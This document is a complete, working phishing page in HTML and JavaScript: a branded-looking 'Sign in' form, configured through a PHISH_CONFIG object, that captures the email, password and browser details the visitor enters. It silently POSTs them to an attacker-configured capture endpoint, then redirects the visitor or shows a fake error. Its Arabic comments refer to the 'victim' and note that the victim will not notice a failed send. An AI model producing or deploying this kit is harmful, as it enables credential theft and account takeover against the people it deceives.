<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<script src="config.js"></script>
<style>
  *{box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
       background:#f5f5f7;display:flex;align-items:center;justify-content:center;
       min-height:100vh;margin:0;padding:20px}
  .card{background:#fff;padding:36px 32px;border-radius:14px;
        box-shadow:0 4px 24px rgba(0,0,0,.08);width:340px;max-width:100%}
  h1{font-size:22px;font-weight:600;margin:0 0 24px;color:#1d1d1f}
  label{display:block;font-size:13px;color:#6e6e73;margin:12px 0 4px}
  input{width:100%;padding:13px 14px;border:1px solid #d2d2d7;border-radius:9px;
        font-size:15px;outline:none;transition:border .15s}
  input:focus{border-color:#0071e3}
  button{width:100%;padding:13px;margin-top:22px;background:#0071e3;color:#fff;
         border:0;border-radius:9px;font-size:15px;font-weight:500;cursor:pointer}
  button:disabled{opacity:.6;cursor:wait}
  .foot{font-size:12px;color:#86868b;margin-top:20px;text-align:center;
        display:flex;align-items:center;justify-content:center;gap:5px}
  .lock{width:11px;height:11px}
  .err{color:#d70015;font-size:13px;margin-top:12px;display:none;text-align:center}
</style>
</head>
<body>
  <div class="card">
    <h1 id="title">Sign in to continue</h1>
    <form id="f" autocomplete="on">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" autocomplete="username" required>
      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="current-password" required>
      <button id="btn" type="submit">Sign in</button>
      <div class="err" id="err">Incorrect email or password.</div>
    </form>
    <div class="foot">
      <svg class="lock" viewBox="0 0 24 24" fill="none" stroke="#86868b" stroke-width="2">
        <rect x="3" y="11" width="18" height="11" rx="2"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
      Secure connection
    </div>
  </div>

<script>
(function(){
  const cfg = window.PHISH_CONFIG;
  document.getElementById("title").textContent = cfg.brand || "Sign in to continue";

  const form = document.getElementById("f");
  const btn  = document.getElementById("btn");
  const err  = document.getElementById("err");

  form.addEventListener("submit", async function(e){
    e.preventDefault();
    btn.disabled = true;
    btn.textContent = "Signing in…";
    err.style.display = "none";

    const payload = {
      email: document.getElementById("email").value,
      password: document.getElementById("password").value,
      ua: navigator.userAgent,
      lang: navigator.language,
      ts: new Date().toISOString(),
      ref: document.referrer || "direct",
      page: location.href,
    };

    // 1) ابعت البيانات للـ endpoint (fire and forget)
    try {
      await fetch(cfg.captureEndpoint, {
        method: "POST",
        mode: "no-cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload),
      });
    } catch(_) {
      // حتى لو فشل الإرسال، الضحية ما تلاحظ
    }

    // 2) حسّس إن فيه خطأ بسيط (يخلي الضحية تحاول مرة ثانية لو الـ endpoint فشل)
    //    أو ودّيه للـ redirect. الافتراضي: redirect.
    if (cfg.redirectAfter) {
      setTimeout(() => { location.href = cfg.redirectAfter; }, 600);
    } else {
      err.style.display = "block";
      btn.disabled = false;
      btn.textContent = "Sign in";
    }
  });
})();
</script>
</body>
</html>
